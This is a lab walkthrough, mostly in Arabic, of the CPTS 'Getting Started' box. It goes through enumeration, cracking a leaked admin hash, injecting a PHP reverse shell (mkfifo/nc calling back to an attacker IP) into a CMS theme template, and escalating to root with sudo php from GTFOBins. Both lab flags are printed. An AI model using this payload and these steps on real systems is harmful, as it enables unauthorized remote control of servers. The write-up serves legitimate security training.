ohhhh, here we go again
Hi, Hackers
As part of my CPTS studies, I’ve finished the first module, “Getting Started.” 
Today, we’re going to do a walkthrough for it — let’s dive into the lab!  
The goal of this lab is to gain an initial foothold, achieve RCE on the server, and then perform privilege escalation
## Lab Walkthrough
**Enumeration**
- كعادة اي حد هنعمل nmap scan
```
nmap 10.129.225.216
```
![](Pasted%20image%2020250918183656.png)
- حلو جدا في بورت 80 مفتوح يلا نبص علي الويب سايت![](Pasted%20image%2020250918183734.png)
- موقع بسيط خالص ومفيهوش اي حاجه
**تعالو نجرب نعمل Fuzzing علي directories من خلال اداة الGobuster**
```
gobuster dir -u http://10.129.225.216 -w /usr/share/wordlists/dirb/common.txt\
```
![](Pasted%20image%2020250918183933.png)
دول كل الdirectories اللي طلعولنا
- اعتقد ان dir بتاع data ده مهم تعالو نخش عليه
![](Pasted%20image%2020250918184039.png)
نخش علي users ممكن ناخد اي creds
لقيت فايل باسم `admin.xml` تعالو ندخل عليه
```
<item>
<USR>admin</USR>
<NAME/>
<PWD>d033e22ae348aeb5660fc2140aec35850c4da997</PWD>
<EMAIL>admin@gettingstarted.com</EMAIL>
<HTMLEDITOR>1</HTMLEDITOR>
<TIMEZONE/>
<LANG>en_US</LANG>
</item>
```
ده المحتوي بتاع الفايل اللي ظهرلي وتقريبا `admin` دي يوزر لحاجه والهاش ده تعالو نكسره كده
![](Pasted%20image%2020250918184237.png)
اوووه الهاش بعد ما كسرناه اسمه `admin` معني كده ان دول creds لحاجه هنعمل بيها login
![](Pasted%20image%2020250918183933.png)
لو رجعنا تاني علي الdir اللي عملنا fuzz عليها هنلاقي /admin
![](Pasted%20image%2020250918184412.png)
تعالو نسجل هنا ب `admin:admin`
![](Pasted%20image%2020250918184505.png)
بوووووم دخلنا علي admin panel
**Exploitation**
- بعد ما قعدت ادور كتير علي اي طريقه ارفع بيها فايل Reverse Shell بحيث اخد منو RCE
![](Pasted%20image%2020250918184656.png)
دخلت علي التابه دي وبدوس upload ومش عايزه تشتغل
- جربت اروح علي تاب theme
- ![](Pasted%20image%2020250918184752.png)
في زر edit theme جربت ادوس عليه
![](Pasted%20image%2020250918184824.png)
اوف فتحلي هنا اسكريبت ومكتوب بphp ومتاح اني اعدل عليه
فا انا هنا هعدل عليه وهكتب كود ينفذلي reverse shell وهو هنا كمان حاطط مسار الملف عشان اقدر اشغله
```
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.12 4444 >/tmp/f"); ?>
```
كتبت الاسكريبت ده ودوست save
تعالو نروح نفتح البورت ده عندنا ونعمل عليه listen
```
nc -nlvp 4444
```
![](Pasted%20image%2020250918185113.png)
وبعد كده روحنا كتبنا امر `curl` في الterminal
```
curl "http://10.129.225.216/theme/Innovation/template.php"
```
![](Pasted%20image%2020250918185232.png)
![](Pasted%20image%2020250918185243.png)
بووووم اخدنا الشيل
هنحاول ندور بقي علي `user.txt` زي ما قايلنا
![](Pasted%20image%2020250918185330.png)
ده الفلاج : `7002d65b149b0a4d19132a66feed21d8`
**Post-Exploitation**
- بعد ما اخدنا شيل علي السيرفر محتاجين دلوقتي نعمل privesc
- هنا هنستخدم تكنيك ال`sudo -l` 
![](Pasted%20image%2020250918185442.png)
لقيت في امر php ممكن انفذو كا root من غير pass
- روحت علي موقع **GTFObins** وسرشت علي php
https://gtfobins.github.io/gtfobins/php/#sudo
![](Pasted%20image%2020250918185548.png)
يلا ناخد الكود ده كوبي وننفذه
![](Pasted%20image%2020250918185633.png)
بووووم بقينا root وبقي سهل دلوقتي نجيب الفلاج التاني
![](Pasted%20image%2020250918185719.png)
جبنا الفلاج التاني
الفلاج: `f1fba6e9f71efb2630e6e34da6387842`

بس كده وبكده نكون جبنا الفلاجين وحلينا اللاب بنجاح

----
### ✅ Feel free to connect with me:

- [LinkedIn – Muhammed Tantawy](https://www.linkedin.com/in/muhammed-tantawy-484441218/)
- [GitHub – tantawix](https://github.com/tantawix)

Thanks for reading 🙌  
More write-ups coming soon — stay tuned!